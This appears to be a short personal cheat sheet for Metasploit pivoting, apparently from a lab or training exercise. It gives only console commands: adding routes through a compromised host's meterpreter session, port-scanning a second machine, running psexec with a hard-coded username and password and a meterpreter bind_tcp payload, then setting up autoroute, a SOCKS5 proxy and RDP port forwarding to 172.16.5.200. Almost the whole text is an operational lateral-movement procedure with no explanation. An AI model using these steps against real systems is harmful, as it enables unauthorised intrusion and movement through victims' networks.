#pivoting #tunneling #metasploit 

172.16.5.200 is the device we are pivoting to from the initial compromised host which we have a meterpreter session.

## Manual Configuration
### Adding Routes

```msf
bg
```

12 is the session number
```msf
route add 172.16.5.0/24 12
```

```msf
route print
```

### Device Scannner

```msf
use auxiliary/scanner/portscan/tcp
```

```msf
set RHOSTS 172.16.5.200
```

```msf
set PORTS 445,3389
```


### PSEXEC  config to connect to the second machine

```msf
use exploit/windows/smb/psexec
```

```msf
set SMBUser luiza
```

```msf
set SMBPass "BoccieDearAeroMeow1!"
```

```msf
set payload windows/x64/meterpreter/bind_tcp
```


## Auto Pivot(+ SOCKS Proxy)

```msf
use multi/manage/autoroute
```

12 is the initially compromised host
```msf
set session 12
```

```msf
run
```

### Setting Up Proxy

```msf
use auxiliary/server/socks_proxy
```

```msf
set SRVHOST 127.0.0.1
```

```msf
set VERSION 5
```

```msf
run -j
```

### Setting Up port Forward

in the meterpreter session

```msf
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```
